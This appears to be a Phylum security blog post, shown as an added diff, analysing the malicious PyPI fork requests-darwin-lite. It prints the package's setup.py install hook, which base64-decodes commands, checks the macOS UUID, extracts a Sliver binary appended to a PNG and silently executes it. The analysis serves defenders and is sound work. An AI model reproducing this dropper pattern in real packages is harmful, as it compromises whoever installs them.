@@ -1,0 +1,110 @@
+
+On May 10, 2024, Phylum’s automated risk detection platform alerted us to a suspicious publication on PyPI. The package was called requests-darwin-lite and appeared to be a fork of the ever-popular requests package with a few key differences, most notably the inclusion of a malicious Go binary packed into a large version of the actual requests side-bar PNG logo, which the author purported to be.
+
+Update (May 17, 2024)
+Yesterday, the attacker released another package on PyPI named ml-linear-regression. This time, instead of appending a malicious Go binary to a PNG file, they appended it to a PDF file titled "simple_linear_regression.pdf" included in the package. Another notable change in this package is the addition of another UUID, "3E7C2DED-1099-5E75-B96F-B63D5F8C479E", to the list of targets for malicious deployment. If this your UUID, beware! Otherwise, the attack method remains consistent with that outlined below. We will continue to provide updates as the situation develops.
+The Attack
+As mentioned earlier, this package is a fork of requests that uses a setuptools attribute called cmdclass that allows the author to customize various actions during package installation. In the case of requests, cmdclass is employed to customize how tests are executed when specifically run using setup commands. They have implemented parallelized testing to optimize performance based on the number of CPU cores available on the machine, enhancing testing efficiency during development. Let’s briefly take a look at a part of the legitimate requests’s setup.py file:
+# --- CLIPPED ---
+
+class PyTest(TestCommand):
+    user_options = [("pytest-args=", "a", "Arguments to pass into py.test")]
+
+    def initialize_options(self):
+        TestCommand.initialize_options(self)
+        try:
+            from multiprocessing import cpu_count
+
+            self.pytest_args = ["-n", str(cpu_count()), "--boxed"]
+        except (ImportError, NotImplementedError):
+            self.pytest_args = ["-n", "1", "--boxed"]
+
+    def finalize_options(self):
+        TestCommand.finalize_options(self)
+        self.test_args = []
+        self.test_suite = True
+
+    def run_tests(self):
+        import pytest
+
+        errno = pytest.main(self.pytest_args)
+        sys.exit(errno)
+
+setup(
+    # --- CLIPPED ---
+    cmdclass={"test": PyTest},
+    tests_require=test_requirements,
+    extras_require={
+        "security": [],
+        "socks": ["PySocks>=1.5.6, !=1.5.7"],
+        "use_chardet_on_py3": ["chardet>=3.0.2,<6"],
+    },
+    project_urls={
+        "Documentation": "<https://requests.readthedocs.io>",
+        "Source": "<https://github.com/psf/requests>",
+    },
+)
+Excerpt from the legitimate requests package setup.py file
+We can clearly see here a legitimate use for the cmdclass attribute. Now let’s take a look at the same parts of the malicious requests-darwin-lite package’s setup.py file:
+# --- CLIPPED ---
+class PyInstall(install):
+    def run(self):
+        if sys.platform != "darwin":
+            return 
+        
+        c = b64decode("aW9yZWcgLWQyIC1jIElPUGxhdGZvcm1FeHBlcnREZXZpY2U=").decode()
+        raw = subprocess.run(c.split(), stdout=subprocess.PIPE).stdout.decode()
+        k = b64decode("SU9QbGF0Zm9ybVVVSUQ=").decode()
+        uuid = raw[raw.find(k)+19:raw.find(k)+55]
+        
+        if uuid == "08383A8F-DA4B-5783-A262-4DDC93169C52":
+            dest = "docs/_static/requests-sidebar-large.png"
+            dest_dir = "/tmp/go-build333212398/exe/"
+            with open(dest, "rb") as fd:
+                content = fd.read()
+
+            offset = 306086
+            os.makedirs(dest_dir, exist_ok=True)
+            with open(dest_dir + "output", "wb") as fd:
+                fd.write(content[offset:])
+
+            os.chmod(dest_dir + "output", 0o755)
+            subprocess.Popen([dest_dir + "output"], close_fds=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+            install.run(self)
+setup(
+    # --- CLIPPED ---
+    cmdclass={
+        "install" : PyInstall,
+        "test": PyTest,
+        },
+    tests_require=test_requirements,
+    extras_require={
+        "security": [],
+        "socks": ["PySocks>=1.5.6, !=1.5.7"],
+        "use_chardet_on_py3": ["chardet>=3.0.2,<6"],
+    },
+    project_urls={
+        "Documentation": "<https://requests.readthedocs.io>",
+        "Source": "<https://github.com/psf/requests>",
+    },
+)
+The setup.py file from the malicious requests-darwin-lite package
+In this malicious fork, the attacker inserted another item into the cmdclass dictionary called PyInstall, which was executed during package installation. Looking at PyInstall we can see they specifically target darwin, or macOS systems. If this package is installed on a macOS system, it decodes a base64-encoded string and runs it as a command. That base64 decodes to ioreg -d2 -c IOPlatformExpertDevice which is then used to gather the system’s UUID. It then performs a check against a specific UUID. If this check fails, nothing happens. In other words, they’re looking for a very specific machine to which they already know the UUID.
+The fact that they’re after a specific UUID is interesting and could have several implications. The first and most obvious is that this is a highly targeted attack and the attackers have already pre-determined the target system and obtained its UUID in some other way. On the flip side, it could be the attackers just doing operational testing on their own infrastructure, testing the malware deployment mechanisms. Regardless, if it is the machine they’re after, they read data from the file "docs/_static/requests-sidebar-large.png".
+This is interesting because the legit requests package ships with a similar file called docs/_static/requests-sidebar.png that weighs in at around 300kB and is the real logo for the package:
+image: gjj_images\phylum\20240708_170945_279494\requests-sidebar-1.png
+requests
+Looking at the “large” version the attacker shipped with the package, we see it’s around 17MB! “Large” is a bit of an understatement for a PNG and highly suspicious in this context. We can run it through file and see that it does get recognized as a PNG file:
+$ file requests-sidebar-large.png
+requests-sidebar-large.png: PNG image data, 1020 x 1308, 8-bit/color RGBA, non-interlaced
+However, given that we have the source code, we can see the attacker reads this file as binary data and then extracts a portion of it from an offset. Technically, this is considered a form of steganography. They are hiding data—or in this case simply appending data—to the end of a PNG file. This form of steganography is far from novel, but its success lies in its simplicity and the fact that the extra data does not interfere with the image’s normal rendering. Thus, the image appears normal to both the software and the end user, even though it carries additional data. After extracting the hidden data, they then write the chunk to a local file, run chmod to make it executable, and finally silently run it with subprocess.Popen.
+As mentioned earlier, the binary data hidden in this PNG is a Go binary. We haven’t reverse engineered it yet, but several VirusTotal vendors identify it as OSX/Sliver. Sliver appears to be an emerging C2 framework that shares similarities with Cobalt Strike and is favored by attackers of all capabilities for its low barrier to entry and lower detection profile due to its lesser-known status.
+It’s worth noting that the first two versions published to PyPI (2.27.1 and 2.27.2) both had the malicious install hook with the malicious binary-packed PNG. These two versions appear to have been pulled from PyPI by the authors. The second two versions published (2.28.0 and 2.28.1) had the install hook present, but removed the malicious bits from it:
+class PyInstall(install):
+    def run(self):
+        install.run(self)
+The modified install hook from requests-darwin-lite's later versions
+Version 2.28.0 shipped with the binary-packed PNG, though it didn’t appear to be executed on install. The author did not yank this from PyPI themselves. Finally, version 2.28.1, the last version published, contained neither the malicious install hook nor the binary-packed PNG and appeared benign.
+Upon discovery, we immediately reported this to PyPI, and the entire package, including all versions, has been taken down.
+Conclusion
+We can only speculate why the attacker pulled the versions with the malicious install hook but decided to leave one version with the malicious binary-packed PNG and another benign version. Perhaps they left those versions published just long enough to infect their target and then yanked the package back to a benign state. Maybe they left up the version with the malicious binary because they intended to depend on it from another package at some other time, or perhaps even pull it from another piece of software down the line. Either way, we have yet another example of attackers resorting to more evasive and complex techniques to distribute malware in open source ecosystems.
